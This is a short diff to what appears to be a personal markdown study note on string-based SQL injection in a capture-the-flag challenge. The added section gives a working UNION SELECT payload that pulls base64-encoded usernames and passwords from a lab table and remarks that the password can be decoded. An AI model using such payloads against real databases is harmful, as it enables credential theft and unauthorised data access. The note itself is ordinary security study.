@@ -55,4 +55,10 @@ When in string SQL injection point, we also can use UNION method.
 - Close the `'` before;
 - then follow a new `SELECT` with `UNION`.
 ## Experiment
+use:
+```SQL
+1' union select to_base64(username), to_base64(password) from ctfshow_user2 where username = 'flag' -- 
+```
+![[Pasted image 20241218063217.png]]
+We can decode the password.
 
